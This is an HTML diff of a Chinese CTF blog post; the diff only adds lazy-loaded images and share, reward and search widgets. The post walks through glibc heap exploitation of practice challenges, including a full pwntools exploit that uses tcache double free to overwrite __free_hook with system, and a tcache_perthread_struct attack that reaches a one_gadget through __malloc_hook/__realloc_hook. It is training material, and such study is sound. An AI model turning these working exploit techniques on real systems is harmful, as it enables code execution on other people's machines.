 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show(8)</span><br><span class="line">libc_base=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251204201047348.png"  alt="image-20251204201047348"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251204201047348.png"
+                        alt="image-20251204201047348"
+                 ></p>
 <p>接着释放7让他们合并，并且free8,实现double free</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delet(7)</span><br><span class="line">add(0x80)</span><br><span class="line">delet(8)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251204202745709.png"  alt="image-20251204202745709"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251204202745709.png"
+                        alt="image-20251204202745709"
+                 ></p>
 <p>之后就是改fd让它malloc到hook，然后把hook改为system函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./pwn&quot;</span><br><span class="line">remote_host = &quot;&quot;</span><br><span class="line">remote_port = 2121</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(&quot;./libc-2.29.so&quot;)</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">#     gdb.attach(p, &quot;&quot;&quot;</span><br><span class="line"># b *0x08048666</span><br><span class="line"># c</span><br><span class="line"># &quot;&quot;&quot;, api=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def ru(a):</span><br><span class="line">    p.recvuntil(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">def add(size, content = &quot;a&quot;):</span><br><span class="line">    sa(b&quot;choice:&quot;, b&quot;1&quot;)</span><br><span class="line">    sa(b&quot;Size:&quot;, str(size))</span><br><span class="line">    sa(b&quot;Content:&quot;, content)</span><br><span class="line">def delet(idx):</span><br><span class="line">    sa(b&quot;choice:&quot;, b&quot;2&quot;)</span><br><span class="line">    sa(b&quot;Index: &quot;, str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sa(b&quot;choice:&quot;, b&quot;3&quot;)</span><br><span class="line">    sa(b&quot;Index:&quot;, str(idx))</span><br><span class="line">    ru(b&quot;Content: &quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for _ in range(7):</span><br><span class="line">    add(0x80)</span><br><span class="line"></span><br><span class="line">add(0x80)#7</span><br><span class="line">add(0x80)#8</span><br><span class="line">add(0x20, b&quot;/bin/sh\x00&quot;)#隔开</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delet(i)</span><br><span class="line"></span><br><span class="line">delet(8)</span><br><span class="line">#dbg()</span><br><span class="line"></span><br><span class="line">show(8)</span><br><span class="line">libc_base=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x1e4ca0</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">delet(7)</span><br><span class="line">add(0x80)</span><br><span class="line">delet(8)</span><br><span class="line">#dbg()</span><br><span class="line">add(0xb0, b&quot;a&quot;*0x80 + p64(0) + p64(0x91) + p64(free_hook))</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80,p64(system))</span><br><span class="line">delet(9)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -688,45 +805,115 @@
 <h3 id="V-N2020-公开赛-easyTHeap"><a href="#V-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[V&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]easyTHeap" >附件<i class="fas fa-external-link-alt"></i></a></p>
 <p>最多只能申请7个chunk，delete只能执行3次,libc是2.27的，没有double free的校验</p>
 <p>add限制大小</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207195931612.png"  alt="image-20251207195931612"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207210321586.png"  alt="image-20251207210321586"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207195931612.png"
+                        alt="image-20251207195931612"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207210321586.png"
+                        alt="image-20251207210321586"
+                 ></p>
 <p>edit不能溢出</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207200007516.png"  alt="image-20251207200007516"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207200007516.png"
+                        alt="image-20251207200007516"
+                 ></p>
 <p>有show</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207200033631.png"  alt="image-20251207200033631"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207200033631.png"
+                        alt="image-20251207200033631"
+                 ></p>
 <p>delete存在uaf，没有把指针置零，纳那么每个add的chunk的数字都不同</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207200050490.png"  alt="image-20251207200050490"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207200050490.png"
+                        alt="image-20251207200050490"
+                 ></p>
 <p>利用二次释放在<code>tcache_perthread_struct</code>处，创造fack chunk。从而修改<code>tcache_perthread_struct</code>的值将假造tache已满的情况。从而free出libc。</p>
 <p>再改<code>tcache_perthread_struct</code>的entries区域的内容，使某一大小的bin的指针变成我们fack chunk的指针从而改写<code>__realloc_hook</code>与<code>__moalloc_hook</code>，从而执行one_gadget.</p>
 <p>double free改fd拿到tcache_struct位置</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211210808636.png"  alt="image-20260211210808636"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211210808636.png"
+                        alt="image-20260211210808636"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(0x50)#0  </span><br><span class="line">delete(0)</span><br><span class="line">delete(0)  </span><br><span class="line">show(0)</span><br><span class="line">#dbg()</span><br><span class="line">struct= u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;)) - 0x250</span><br><span class="line">print(hex(struct))</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207204946829.png"  alt="image-20251207204946829"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207204946829.png"
+                        alt="image-20251207204946829"
+                 ></p>
 <p>改fd让chunk maloc过去</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x50)  # 1</span><br><span class="line">edit(1, p64(struct)) #fd</span><br><span class="line">add(0x50)  # 2</span><br><span class="line">add(0x50)  # 3 tar</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>当程序释放第一个堆进 tcache 时会申请一块 0x240 的空间放 tcache struct ，里面记录各个 size 的数量和链头地址。这里的2是tcachebin中的2个0x60的chunk</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211212207962.png"  alt="image-20260211212207962"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211212207962.png"
+                        alt="image-20260211212207962"
+                 ></p>
 </blockquote>
 <p>伪造tacche是满的，让函数进入unsorted bin泄露libc</p>
 <p>把 tcache struct 开头 0x28 字节覆盖成 <code>0x61</code>（ASCII ‘a’）这种非零值。<br> 0x28 落在 <strong>counts 区域内部</strong>，会让某几个 size class 的 <code>counts[i]</code> 变成一个很大的非零数（等价于“这个 bin 计数已经到上限 7 了”）。</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211213049910.png"  alt="image-20260211213049910"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211213049910.png"
+                        alt="image-20260211213049910"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">edit(3, b&#x27;a&#x27; * 0x28)</span><br><span class="line">delete(3)</span><br><span class="line">show(3)</span><br><span class="line">#dbg()</span><br><span class="line">libc_base = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 0x3ebca0</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc = libc_base + libc.symbols[&#x27;__libc_realloc&#x27;]</span><br><span class="line">one = libc_base + 0x4f322</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211212813160.png"  alt="image-20260211212813160"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211212813160.png"
+                        alt="image-20260211212813160"
+                 ></p>
 <p>继续malloc识别道tcache的异常会拿到在struct附近的unsorted bin,</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211213226206.png"  alt="image-20260211213226206"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211213226206.png"
+                        alt="image-20260211213226206"
+                 ></p>
 <p>接着改0x30对应的next为malloc—hook的size</p>
 <p>（这里不能溢出只能改到0x30处，但是tcache没有size的校验）</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211213821812.png"  alt="image-20260211213821812"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260211213821812.png"
+                        alt="image-20260211213821812"
+                 ></p>
 <p>以调用one_gadget</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(0x50)  # 4</span><br><span class="line">#dbg()</span><br><span class="line">edit(4, b&#x27;a&#x27; * 0x48 + p64(malloc_hook - 0x13))</span><br><span class="line">add(0x20)  # 5 </span><br><span class="line">log.info(&quot;one_gadget: &quot; + hex(one))</span><br><span class="line">edit(5, b&#x27;\x00&#x27; * (0x13 - 0x8) + p64(one) + p64(realloc + 8))</span><br><span class="line">#dbg()</span><br><span class="line">add(0x10)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207214752979.png"  alt="image-20251207214752979"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207214752979.png"
+                        alt="image-20251207214752979"
+                 ></p>
 <p>实现</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207215159291.png"  alt="image-20251207215159291"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207215159291.png"
+                        alt="image-20251207215159291"
+                 ></p>
 <p>malloc→__malloc_hook(&#x3D;realloc+8)→realloc→__realloc_hook(&#x3D;one)→one_gadget</p>
 <p>这是一种 <strong>“trampoline（跳板）”打法</strong>。</p>
 <blockquote>
@@ -775,8 +962,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -967,6 +1190,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -1069,6 +1305,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -1108,8 +1373,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -1134,6 +1407,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
